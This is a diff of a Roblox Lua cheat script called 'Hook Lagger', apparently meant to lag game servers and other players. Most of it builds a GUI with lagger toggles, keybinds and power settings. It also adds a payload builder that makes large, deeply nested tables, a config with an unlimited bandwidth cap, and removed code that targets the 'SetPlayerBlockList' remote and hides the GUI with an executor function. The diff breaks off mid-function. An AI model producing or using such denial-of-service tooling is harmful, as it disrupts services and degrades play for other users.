@@ -1,657 +1,996 @@
--- ============================================================
--- HOOK LAGGER — Full Auto Toggle
--- ============================================================
+local HookLagger = Instance.new("ScreenGui")
+HookLagger.Name = "HookLagger"
+HookLagger.ResetOnSpawn = false
+HookLagger.IgnoreGuiInset = true
+HookLagger.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+HookLagger.ScreenInsets = Enum.ScreenInsets.DeviceSafeInsets
 
-local Players          = game:GetService("Players")
+local Main = Instance.new("Frame")
+Main.Name = "Main"
+Main.Active = true
+Main.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
+Main.BorderSizePixel = 0
+Main.ClipsDescendants = true
+Main.Position = UDim2.new(0.5, 110, 0.5, -157)
+Main.Size = UDim2.new(0, 260, 0, 165)
+Main.Parent = HookLagger
+
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 14)
+UICorner.Parent = Main
+
+local UIStroke = Instance.new("UIStroke")
+UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+UIStroke.Color = Color3.fromRGB(255, 255, 255)
+UIStroke.Thickness = 3.2
+UIStroke.Parent = Main
+
+local UIGradient = Instance.new("UIGradient")
+UIGradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 0, 0)), ColorSequenceKeypoint.new(0.2, Color3.fromRGB(200, 15, 15)), ColorSequenceKeypoint.new(0.45, Color3.fromRGB(255, 50, 50)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 140, 140)), ColorSequenceKeypoint.new(0.55, Color3.fromRGB(255, 50, 50)), ColorSequenceKeypoint.new(0.8, Color3.fromRGB(200, 15, 15)), ColorSequenceKeypoint.new(1, Color3.fromRGB(120, 0, 0))})
+UIGradient.Rotation = 168.85
+UIGradient.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 0.75, 0), NumberSequenceKeypoint.new(0.25, 0.4, 0), NumberSequenceKeypoint.new(0.5, 0, 0), NumberSequenceKeypoint.new(0.75, 0.4, 0), NumberSequenceKeypoint.new(1, 0.75, 0)})
+UIGradient.Parent = UIStroke
+
+local Frame = Instance.new("Frame")
+Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BackgroundTransparency = 0.55
+Frame.BorderSizePixel = 0
+Frame.Size = UDim2.new(1, 0, 1, 0)
+Frame.ZIndex = -1
+Frame.Parent = Main
+
+local UICorner_2 = Instance.new("UICorner")
+UICorner_2.CornerRadius = UDim.new(0, 14)
+UICorner_2.Parent = Frame
+
+local HeaderImage = Instance.new("ImageLabel")
+HeaderImage.Name = "HeaderImage"
+HeaderImage.BackgroundTransparency = 1
+HeaderImage.Size = UDim2.new(1, 0, 0, 50)
+HeaderImage.ZIndex = 3
+HeaderImage.Image = "rbxasset://b2d01f960941698543f20873e2b70ce7/aspect_header.png"
+HeaderImage.ScaleType = Enum.ScaleType.Crop
+HeaderImage.Parent = Main
+
+local Frame_2 = Instance.new("Frame")
+Frame_2.BackgroundColor3 = Color3.fromRGB(239, 68, 68)
+Frame_2.BackgroundTransparency = 0.55
+Frame_2.BorderSizePixel = 0
+Frame_2.Position = UDim2.new(0, 14, 0, 54)
+Frame_2.Size = UDim2.new(1, -28, 0, 1)
+Frame_2.ZIndex = 5
+Frame_2.Parent = Main
+
+---------------------------------------------------------------------
+-- ============ ENGRAINAGE + CADENAS (dans le header) ============
+---------------------------------------------------------------------
+
+local Settings = Instance.new("TextButton")
+Settings.Name = "Settings"
+Settings.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
+Settings.BackgroundTransparency = 0.15
+Settings.BorderSizePixel = 0
+Settings.Position = UDim2.new(1, -62, 0, 8)
+Settings.Size = UDim2.new(0, 24, 0, 24)
+Settings.AutoButtonColor = false
+Settings.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
+Settings.Text = "⚙"
+Settings.TextColor3 = Color3.fromRGB(240, 240, 250)
+Settings.TextSize = 14
+Settings.ZIndex = 8
+Settings.Parent = Main
+
+local UICorner_11 = Instance.new("UICorner")
+UICorner_11.CornerRadius = UDim.new(0, 6)
+UICorner_11.Parent = Settings
+
+local UIStroke_8 = Instance.new("UIStroke")
+UIStroke_8.Color = Color3.fromRGB(80, 80, 95)
+UIStroke_8.Thickness = 1.2
+UIStroke_8.Transparency = 0.45
+UIStroke_8.Parent = Settings
+
+local Lock = Instance.new("TextButton")
+Lock.Name = "Lock"
+Lock.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
+Lock.BackgroundTransparency = 0.15
+Lock.BorderSizePixel = 0
+Lock.Position = UDim2.new(1, -32, 0, 8)
+Lock.Size = UDim2.new(0, 24, 0, 24)
+Lock.AutoButtonColor = false
+Lock.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
+Lock.Text = "🔒"
+Lock.TextColor3 = Color3.fromRGB(240, 240, 250)
+Lock.TextSize = 13
+Lock.ZIndex = 8
+Lock.Parent = Main
+
+local UICorner_12 = Instance.new("UICorner")
+UICorner_12.CornerRadius = UDim.new(0, 6)
+UICorner_12.Parent = Lock
+
+local UIStroke_9 = Instance.new("UIStroke")
+UIStroke_9.Color = Color3.fromRGB(80, 80, 95)
+UIStroke_9.Thickness = 1.2
+UIStroke_9.Transparency = 0.45
+UIStroke_9.Parent = Lock
+
+---------------------------------------------------------------------
+-- ============ TITRE HEADER (Hook Lagger / Go skid yall) ============
+---------------------------------------------------------------------
+
+local TitleLabel = Instance.new("TextLabel")
+TitleLabel.Name = "TitleLabel"
+TitleLabel.BackgroundTransparency = 1
+TitleLabel.Position = UDim2.new(0, 14, 0, 4)
+TitleLabel.Size = UDim2.new(1, -100, 0, 22)
+TitleLabel.ZIndex = 8
+TitleLabel.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
+TitleLabel.Text = "HOOK LAGGER"
+TitleLabel.TextColor3 = Color3.fromRGB(239, 68, 68)
+TitleLabel.TextSize = 20
+TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+TitleLabel.TextYAlignment = Enum.TextYAlignment.Center
+TitleLabel.Parent = Main
+
+local UIStroke_Title = Instance.new("UIStroke")
+UIStroke_Title.Color = Color3.fromRGB(80, 0, 0)
+UIStroke_Title.Thickness = 1
+UIStroke_Title.Transparency = 0.35
+UIStroke_Title.Parent = TitleLabel
+
+local SubtitleLabel = Instance.new("TextLabel")
+SubtitleLabel.Name = "SubtitleLabel"
+SubtitleLabel.BackgroundTransparency = 1
+SubtitleLabel.Position = UDim2.new(0, 14, 0, 26)
+SubtitleLabel.Size = UDim2.new(1, -100, 0, 14)
+SubtitleLabel.ZIndex = 8
+SubtitleLabel.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
+SubtitleLabel.Text = "go skid yall"
+SubtitleLabel.TextColor3 = Color3.fromRGB(255, 180, 180)
+SubtitleLabel.TextSize = 11
+SubtitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+SubtitleLabel.TextYAlignment = Enum.TextYAlignment.Center
+SubtitleLabel.Parent = Main
+
+-- Effets hover pour les deux petits boutons
+local function addHover(btn)
+    btn.MouseEnter:Connect(function()
+        TweenService:Create(btn, TweenInfo.new(0.15), { BackgroundColor3 = Color3.fromRGB(30, 30, 40) }):Play()
+    end)
+    btn.MouseLeave:Connect(function()
+        TweenService:Create(btn, TweenInfo.new(0.15), { BackgroundColor3 = Color3.fromRGB(12, 12, 16) }):Play()
+    end)
+end
+
+---------------------------------------------------------------------
+-- ============ PC LAGGER ============
+---------------------------------------------------------------------
+
+local PCLagger = Instance.new("Frame")
+PCLagger.Name = "PC Lagger"
+PCLagger.BackgroundColor3 = Color3.fromRGB(6, 6, 9)
+PCLagger.BackgroundTransparency = 0.28
+PCLagger.BorderSizePixel = 0
+PCLagger.Position = UDim2.new(0, 14, 0, 62)
+PCLagger.Size = UDim2.new(1, -28, 0, 42)
+PCLagger.ZIndex = 5
+PCLagger.Parent = Main
+
+local UICorner_3 = Instance.new("UICorner")
+UICorner_3.CornerRadius = UDim.new(0, 10)
+UICorner_3.Parent = PCLagger
+
+local UIStroke_2 = Instance.new("UIStroke")
+UIStroke_2.Color = Color3.fromRGB(60, 60, 72)
+UIStroke_2.Thickness = 1.2
+UIStroke_2.Transparency = 0.4
+UIStroke_2.Parent = PCLagger
+
+local TextLabel = Instance.new("TextLabel")
+TextLabel.BackgroundTransparency = 1
+TextLabel.Position = UDim2.new(0, 12, 0, 0)
+TextLabel.Size = UDim2.new(1, -125, 1, 0)
+TextLabel.ZIndex = 6
+TextLabel.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
+TextLabel.Text = "PC Lagger"
+TextLabel.TextColor3 = Color3.fromRGB(240, 240, 250)
+TextLabel.TextSize = 13
+TextLabel.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel.Parent = PCLagger
+
+local KeybindButton = Instance.new("TextButton")
+KeybindButton.Name = "KeybindButton"
+KeybindButton.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+KeybindButton.BorderSizePixel = 0
+KeybindButton.Position = UDim2.new(1, -108, 0.5, -11)
+KeybindButton.Size = UDim2.new(0, 44, 0, 22)
+KeybindButton.ZIndex = 7
+KeybindButton.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
+KeybindButton.Text = "NONE"
+KeybindButton.TextColor3 = Color3.fromRGB(200, 200, 210)
+KeybindButton.TextSize = 10
+KeybindButton.Parent = PCLagger
+
+local UICorner_4 = Instance.new("UICorner")
+UICorner_4.CornerRadius = UDim.new(0, 6)
+UICorner_4.Parent = KeybindButton
+
+local UIStroke_3 = Instance.new("UIStroke")
+UIStroke_3.Color = Color3.fromRGB(80, 80, 95)
+UIStroke_3.Transparency = 0.5
+UIStroke_3.Parent = KeybindButton
+
+local Track = Instance.new("Frame")
+Track.Name = "Track"
+Track.BackgroundColor3 = Color3.fromRGB(55, 55, 68)
+Track.BorderSizePixel = 0
+Track.Position = UDim2.new(1, -58, 0.5, -12)
+Track.Size = UDim2.new(0, 46, 0, 24)
+Track.ZIndex = 7
+Track.Parent = PCLagger
+
+local UICorner_5 = Instance.new("UICorner")
+UICorner_5.CornerRadius = UDim.new(1, 0)
+UICorner_5.Parent = Track
+
+local Knob = Instance.new("Frame")
+Knob.Name = "Knob"
+Knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Knob.BorderSizePixel = 0
+Knob.Position = UDim2.new(0, 3, 0.5, -9)
+Knob.Size = UDim2.new(0, 18, 0, 18)
+Knob.ZIndex = 8
+Knob.Parent = Track
+
+local UICorner_6 = Instance.new("UICorner")
+UICorner_6.CornerRadius = UDim.new(1, 0)
+UICorner_6.Parent = Knob
+
+local UIStroke_4 = Instance.new("UIStroke")
+UIStroke_4.Transparency = 0.6
+UIStroke_4.Parent = Knob
+
+local ToggleButton = Instance.new("TextButton")
+ToggleButton.Name = "ToggleButton"
+ToggleButton.BackgroundTransparency = 1
+ToggleButton.Size = UDim2.new(1, 0, 1, 0)
+ToggleButton.ZIndex = 9
+ToggleButton.Text = ""
+ToggleButton.Parent = Track
+
+---------------------------------------------------------------------
+-- ============ LOW POWER LAGGER ============
+---------------------------------------------------------------------
+
+local LowPowerLagger = Instance.new("Frame")
+LowPowerLagger.Name = "Low Power Lagger"
+LowPowerLagger.BackgroundColor3 = Color3.fromRGB(6, 6, 9)
+LowPowerLagger.BackgroundTransparency = 0.28
+LowPowerLagger.BorderSizePixel = 0
+LowPowerLagger.Position = UDim2.new(0, 14, 0, 110)
+LowPowerLagger.Size = UDim2.new(1, -28, 0, 42)
+LowPowerLagger.ZIndex = 5
+LowPowerLagger.Parent = Main
+
+local UICorner_7 = Instance.new("UICorner")
+UICorner_7.CornerRadius = UDim.new(0, 10)
+UICorner_7.Parent = LowPowerLagger
+
+local UIStroke_5 = Instance.new("UIStroke")
+UIStroke_5.Color = Color3.fromRGB(60, 60, 72)
+UIStroke_5.Thickness = 1.2
+UIStroke_5.Transparency = 0.4
+UIStroke_5.Parent = LowPowerLagger
+
+local TextLabel_2 = Instance.new("TextLabel")
+TextLabel_2.BackgroundTransparency = 1
+TextLabel_2.Position = UDim2.new(0, 12, 0, 0)
+TextLabel_2.Size = UDim2.new(1, -125, 1, 0)
+TextLabel_2.ZIndex = 6
+TextLabel_2.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
+TextLabel_2.Text = "Low Power Lagger"
+TextLabel_2.TextColor3 = Color3.fromRGB(240, 240, 250)
+TextLabel_2.TextSize = 13
+TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel_2.Parent = LowPowerLagger
+
+local KeybindButton_2 = Instance.new("TextButton")
+KeybindButton_2.Name = "KeybindButton"
+KeybindButton_2.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+KeybindButton_2.BorderSizePixel = 0
+KeybindButton_2.Position = UDim2.new(1, -108, 0.5, -11)
+KeybindButton_2.Size = UDim2.new(0, 44, 0, 22)
+KeybindButton_2.ZIndex = 7
+KeybindButton_2.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
+KeybindButton_2.Text = "NONE"
+KeybindButton_2.TextColor3 = Color3.fromRGB(200, 200, 210)
+KeybindButton_2.TextSize = 10
+KeybindButton_2.Parent = LowPowerLagger
+
+local UICorner_8 = Instance.new("UICorner")
+UICorner_8.CornerRadius = UDim.new(0, 6)
+UICorner_8.Parent = KeybindButton_2
+
+local UIStroke_6 = Instance.new("UIStroke")
+UIStroke_6.Color = Color3.fromRGB(80, 80, 95)
+UIStroke_6.Transparency = 0.5
+UIStroke_6.Parent = KeybindButton_2
+
+local Track_2 = Instance.new("Frame")
+Track_2.Name = "Track"
+Track_2.BackgroundColor3 = Color3.fromRGB(55, 55, 68)
+Track_2.BorderSizePixel = 0
+Track_2.Position = UDim2.new(1, -58, 0.5, -12)
+Track_2.Size = UDim2.new(0, 46, 0, 24)
+Track_2.ZIndex = 7
+Track_2.Parent = LowPowerLagger
+
+local UICorner_9 = Instance.new("UICorner")
+UICorner_9.CornerRadius = UDim.new(1, 0)
+UICorner_9.Parent = Track_2
+
+local Knob_2 = Instance.new("Frame")
+Knob_2.Name = "Knob"
+Knob_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Knob_2.BorderSizePixel = 0
+Knob_2.Position = UDim2.new(0, 3, 0.5, -9)
+Knob_2.Size = UDim2.new(0, 18, 0, 18)
+Knob_2.ZIndex = 8
+Knob_2.Parent = Track_2
+
+local UICorner_10 = Instance.new("UICorner")
+UICorner_10.CornerRadius = UDim.new(1, 0)
+UICorner_10.Parent = Knob_2
+
+local UIStroke_7 = Instance.new("UIStroke")
+UIStroke_7.Transparency = 0.6
+UIStroke_7.Parent = Knob_2
+
+local ToggleButton_2 = Instance.new("TextButton")
+ToggleButton_2.Name = "ToggleButton"
+ToggleButton_2.BackgroundTransparency = 1
+ToggleButton_2.Size = UDim2.new(1, 0, 1, 0)
+ToggleButton_2.ZIndex = 9
+ToggleButton_2.Text = ""
+ToggleButton_2.Parent = Track_2
+
+---------------------------------------------------------------------
+-- ============ SETTINGS PANEL (popup à droite du Main) ============
+---------------------------------------------------------------------
+
+local SettingsPanel = Instance.new("Frame")
+SettingsPanel.Name = "SettingsPanel"
+SettingsPanel.Active = true
+SettingsPanel.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
+SettingsPanel.BorderSizePixel = 0
+SettingsPanel.Position = UDim2.new(0.5, 376, 0.5, -157)
+SettingsPanel.Size = UDim2.new(0, 150, 0, 165)
+SettingsPanel.Visible = false
+SettingsPanel.Parent = HookLagger
+
+local UICorner_13 = Instance.new("UICorner")
+UICorner_13.CornerRadius = UDim.new(0, 14)
+UICorner_13.Parent = SettingsPanel
+
+local UIStroke_10 = Instance.new("UIStroke")
+UIStroke_10.Color = Color3.fromRGB(80, 80, 95)
+UIStroke_10.Thickness = 1.4
+UIStroke_10.Transparency = 0.45
+UIStroke_10.Parent = SettingsPanel
+
+local UIGradient_2 = Instance.new("UIGradient")
+UIGradient_2.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 20, 20)), ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 10, 14))})
+UIGradient_2.Rotation = 45
+UIGradient_2.Parent = SettingsPanel
+
+local Frame_3 = Instance.new("Frame")
+Frame_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Frame_3.BackgroundTransparency = 0.55
+Frame_3.BorderSizePixel = 0
+Frame_3.Size = UDim2.new(1, 0, 1, 0)
+Frame_3.Parent = SettingsPanel
+
+local UICorner_14 = Instance.new("UICorner")
+UICorner_14.CornerRadius = UDim.new(0, 14)
+UICorner_14.Parent = Frame_3
+
+local TextLabel_3 = Instance.new("TextLabel")
+TextLabel_3.BackgroundTransparency = 1
+TextLabel_3.Position = UDim2.new(0, 12, 0, 6)
+TextLabel_3.Size = UDim2.new(1, -40, 0, 20)
+TextLabel_3.ZIndex = 5
+TextLabel_3.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
+TextLabel_3.Text = "SETTINGS"
+TextLabel_3.TextColor3 = Color3.fromRGB(239, 68, 68)
+TextLabel_3.TextSize = 12
+TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel_3.Parent = SettingsPanel
+
+local CloseBtn = Instance.new("TextButton")
+CloseBtn.Name = "CloseBtn"
+CloseBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+CloseBtn.BorderSizePixel = 0
+CloseBtn.Position = UDim2.new(1, -26, 0, 6)
+CloseBtn.Size = UDim2.new(0, 20, 0, 20)
+CloseBtn.ZIndex = 6
+CloseBtn.AutoButtonColor = false
+CloseBtn.Text = ""
+CloseBtn.Parent = SettingsPanel
+
+local UICorner_15 = Instance.new("UICorner")
+UICorner_15.CornerRadius = UDim.new(0, 6)
+UICorner_15.Parent = CloseBtn
+
+local UIStroke_11 = Instance.new("UIStroke")
+UIStroke_11.Color = Color3.fromRGB(80, 80, 95)
+UIStroke_11.Transparency = 0.5
+UIStroke_11.Parent = CloseBtn
+
+local Frame_4 = Instance.new("Frame")
+Frame_4.AnchorPoint = Vector2.new(0.5, 0.5)
+Frame_4.BackgroundColor3 = Color3.fromRGB(240, 240, 250)
+Frame_4.BorderSizePixel = 0
+Frame_4.Position = UDim2.new(0.5, 0, 0.5, 0)
+Frame_4.Rotation = 45
+Frame_4.Size = UDim2.new(0, 10, 0, 2)
+Frame_4.ZIndex = 7
+Frame_4.Parent = CloseBtn
+
+local UICorner_16 = Instance.new("UICorner")
+UICorner_16.CornerRadius = UDim.new(1, 0)
+UICorner_16.Parent = Frame_4
+
+local Frame_5 = Instance.new("Frame")
+Frame_5.AnchorPoint = Vector2.new(0.5, 0.5)
+Frame_5.BackgroundColor3 = Color3.fromRGB(240, 240, 250)
+Frame_5.BorderSizePixel = 0
+Frame_5.Position = UDim2.new(0.5, 0, 0.5, 0)
+Frame_5.Rotation = -45
+Frame_5.Size = UDim2.new(0, 10, 0, 2)
+Frame_5.ZIndex = 7
+Frame_5.Parent = CloseBtn
+
+local UICorner_17 = Instance.new("UICorner")
+UICorner_17.CornerRadius = UDim.new(1, 0)
+UICorner_17.Parent = Frame_5
+
+local Frame_6 = Instance.new("Frame")
+Frame_6.BackgroundColor3 = Color3.fromRGB(239, 68, 68)
+Frame_6.BackgroundTransparency = 0.55
+Frame_6.BorderSizePixel = 0
+Frame_6.Position = UDim2.new(0, 12, 0, 30)
+Frame_6.Size = UDim2.new(1, -24, 0, 1)
+Frame_6.ZIndex = 5
+Frame_6.Parent = SettingsPanel
+
+local TextLabel_4 = Instance.new("TextLabel")
+TextLabel_4.BackgroundTransparency = 1
+TextLabel_4.Position = UDim2.new(0, 12, 0, 38)
+TextLabel_4.Size = UDim2.new(1, -24, 0, 14)
+TextLabel_4.ZIndex = 5
+TextLabel_4.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
+TextLabel_4.Text = "PC LAGGER"
+TextLabel_4.TextColor3 = Color3.fromRGB(200, 200, 210)
+TextLabel_4.TextSize = 10
+TextLabel_4.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel_4.Parent = SettingsPanel
+
+local VersionV1 = Instance.new("TextButton")
+VersionV1.BackgroundColor3 = Color3.fromRGB(239, 68, 68)
+VersionV1.BorderSizePixel = 0
+VersionV1.Position = UDim2.new(0, 12, 0, 54)
+VersionV1.Size = UDim2.new(0, 60, 0, 20)
+VersionV1.ZIndex = 6
+VersionV1.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
+VersionV1.Text = "V1"
+VersionV1.TextColor3 = Color3.fromRGB(200, 200, 210)
+VersionV1.TextSize = 10
+VersionV1.Parent = SettingsPanel
+
+local UICorner_18 = Instance.new("UICorner")
+UICorner_18.CornerRadius = UDim.new(0, 6)
+UICorner_18.Parent = VersionV1
+
+local UIStroke_12 = Instance.new("UIStroke")
+UIStroke_12.Color = Color3.fromRGB(80, 80, 95)
+UIStroke_12.Transparency = 0.5
+UIStroke_12.Parent = VersionV1
+
+local VersionV2 = Instance.new("TextButton")
+VersionV2.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+VersionV2.BorderSizePixel = 0
+VersionV2.Position = UDim2.new(0, 78, 0, 54)
+VersionV2.Size = UDim2.new(0, 60, 0, 20)
+VersionV2.ZIndex = 6
+VersionV2.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
+VersionV2.Text = "V2"
+VersionV2.TextColor3 = Color3.fromRGB(200, 200, 210)
+VersionV2.TextSize = 10
+VersionV2.Parent = SettingsPanel
+
+local UICorner_19 = Instance.new("UICorner")
+UICorner_19.CornerRadius = UDim.new(0, 6)
+UICorner_19.Parent = VersionV2
+
+local UIStroke_13 = Instance.new("UIStroke")
+UIStroke_13.Color = Color3.fromRGB(80, 80, 95)
+UIStroke_13.Transparency = 0.5
+UIStroke_13.Parent = VersionV2
+
+local TextLabel_5 = Instance.new("TextLabel")
+TextLabel_5.BackgroundTransparency = 1
+TextLabel_5.Position = UDim2.new(0, 12, 0, 82)
+TextLabel_5.Size = UDim2.new(1, -24, 0, 14)
+TextLabel_5.ZIndex = 5
+TextLabel_5.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
+TextLabel_5.Text = "LOW POWER LAGGER"
+TextLabel_5.TextColor3 = Color3.fromRGB(200, 200, 210)
+TextLabel_5.TextSize = 10
+TextLabel_5.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel_5.Parent = SettingsPanel
+
+local IntensityLow = Instance.new("TextButton")
+IntensityLow.BackgroundColor3 = Color3.fromRGB(239, 68, 68)
+IntensityLow.BorderSizePixel = 0
+IntensityLow.Position = UDim2.new(0, 12, 0, 98)
+IntensityLow.Size = UDim2.new(0, 40, 0, 20)
+IntensityLow.ZIndex = 6
+IntensityLow.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
+IntensityLow.Text = "Low"
+IntensityLow.TextColor3 = Color3.fromRGB(200, 200, 210)
+IntensityLow.TextSize = 10
+IntensityLow.Parent = SettingsPanel
+
+local UICorner_20 = Instance.new("UICorner")
+UICorner_20.CornerRadius = UDim.new(0, 6)
+UICorner_20.Parent = IntensityLow
+
+local UIStroke_14 = Instance.new("UIStroke")
+UIStroke_14.Color = Color3.fromRGB(80, 80, 95)
+UIStroke_14.Transparency = 0.5
+UIStroke_14.Parent = IntensityLow
+
+local IntensityMid = Instance.new("TextButton")
+IntensityMid.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+IntensityMid.BorderSizePixel = 0
+IntensityMid.Position = UDim2.new(0, 56, 0, 98)
+IntensityMid.Size = UDim2.new(0, 40, 0, 20)
+IntensityMid.ZIndex = 6
+IntensityMid.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
+IntensityMid.Text = "Mid"
+IntensityMid.TextColor3 = Color3.fromRGB(200, 200, 210)
+IntensityMid.TextSize = 10
+IntensityMid.Parent = SettingsPanel
+
+local UICorner_21 = Instance.new("UICorner")
+UICorner_21.CornerRadius = UDim.new(0, 6)
+UICorner_21.Parent = IntensityMid
+
+local UIStroke_15 = Instance.new("UIStroke")
+UIStroke_15.Color = Color3.fromRGB(80, 80, 95)
+UIStroke_15.Transparency = 0.5
+UIStroke_15.Parent = IntensityMid
+
+local IntensityHigh = Instance.new("TextButton")
+IntensityHigh.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+IntensityHigh.BorderSizePixel = 0
+IntensityHigh.Position = UDim2.new(0, 100, 0, 98)
+IntensityHigh.Size = UDim2.new(0, 40, 0, 20)
+IntensityHigh.ZIndex = 6
+IntensityHigh.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
+IntensityHigh.Text = "High"
+IntensityHigh.TextColor3 = Color3.fromRGB(200, 200, 210)
+IntensityHigh.TextSize = 10
+IntensityHigh.Parent = SettingsPanel
+
+local UICorner_22 = Instance.new("UICorner")
+UICorner_22.CornerRadius = UDim.new(0, 6)
+UICorner_22.Parent = IntensityHigh
+
+local UIStroke_16 = Instance.new("UIStroke")
+UIStroke_16.Color = Color3.fromRGB(80, 80, 95)
+UIStroke_16.Transparency = 0.5
+UIStroke_16.Parent = IntensityHigh
+
+---------------------------------------------------------------------
+-- ============ LOGIQUE DE LAGGER (Bubble Hub) ============
+---------------------------------------------------------------------
+
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
-local RunService       = game:GetService("RunService")
-local TweenService     = game:GetService("TweenService")
-local LP = Players.LocalPlayer
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
 
--- ===== LAGGER CONFIG =====
-local cfg = {
-    x = 2.5,
-    y = 1,
-    z = 0.15,
-}
-local active = false
-local hotkey = Enum.KeyCode.V
-local remotePath = "RobloxReplicatedStorage.SetPlayerBlockList"
-
--- ===== AUTO SETTINGS =====
-local auto = {
-    enableOnGrab  = false,   -- "ENABLE ON GRAB"
-    disableOnDrop = false,   -- "DISABLE ON DROP"
+local LaggerConfig = {
+    TableIncrease        = 270,
+    LoopWaitTime         = 0.3,
+    LowEndTableIncrease  = 265,
+    LowEndLoopWaitTime   = 0.8,
+    MaxKBPS              = math.huge,
+    LowEndMaxKBPS        = 25000,
+    PowerPCV1            = 270,
+    PowerPCV2            = 296,
+    PowerLow             = 120,
+    PowerMid             = 210,
+    PowerHigh            = 270,
 }
 
--- ===== GUI CLEANUP =====
-for _, n in ipairs({"HookLaggerUI"}) do
-    local old = LP:WaitForChild("PlayerGui"):FindFirstChild(n)
-    if old then old:Destroy() end
+local LaggerState = { Main = false, LowEnd = false }
+local LaggerThreads = { Main = nil, LowEnd = nil }
+local CachedPayload = nil
+local CachedPayloadDepth = nil
+
+local function buildPayload(depth)
+    local outer, chain = {}, { {} }
+    local cursor = chain[1]
+    for _ = 1, depth do
+        local nxt = {}
+        table.insert(cursor, nxt)
+        cursor = nxt
+    end
+    local count = math.min(499999 / (depth + 2), 1500)
+    for _ = 1, count do
+        table.insert(outer, chain)
+    end
+    return outer
 end
 
-local gui = Instance.new("ScreenGui")
-gui.Name = "HookLaggerUI"
-gui.ResetOnSpawn = false
-gui.IgnoreGuiInset = true
-gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-gui.DisplayOrder = 999
-pcall(function() if syn and syn.protect_gui then syn.protect_gui(gui) end end)
-if not pcall(function() gui.Parent = game:GetService("CoreGui") end) then
-    gui.Parent = LP:WaitForChild("PlayerGui")
-end
-
-local C = {
-    bg          = Color3.fromRGB(15, 10, 12),
-    rowBg       = Color3.fromRGB(22, 13, 16),
-    border      = Color3.fromRGB(200, 25, 35),
-    borderGlow  = Color3.fromRGB(120, 10, 15),
-    titleRed    = Color3.fromRGB(245, 30, 40),
-    titleGlow   = Color3.fromRGB(255, 60, 70),
-    label       = Color3.fromRGB(235, 235, 235),
-    labelDim    = Color3.fromRGB(160, 160, 165),
-    btnInactive = Color3.fromRGB(115, 22, 30),
-    btnActive   = Color3.fromRGB(235, 30, 45),
-    trackOff    = Color3.fromRGB(40, 18, 24),
-    trackOn     = Color3.fromRGB(235, 30, 45),
-    knob        = Color3.fromRGB(245, 245, 245),
-    dropdown    = Color3.fromRGB(32, 18, 22),
-    lockOff     = Color3.fromRGB(200, 25, 35),
-    lockOn      = Color3.fromRGB(70, 180, 90),
-    statusOn    = Color3.fromRGB(100, 255, 100),
-    statusOff   = Color3.fromRGB(255, 100, 100),
-}
-
-local locked = false
-
-local function corner(o, r)
-    local c = Instance.new("UICorner")
-    c.CornerRadius = UDim.new(0, r or 6)
-    c.Parent = o
-    return c
-end
-
-local function stroke(o, col, thick, trans, mode)
-    local s = Instance.new("UIStroke")
-    s.Color = col or C.borderGlow
-    s.Thickness = thick or 1
-    s.Transparency = trans or 0.4
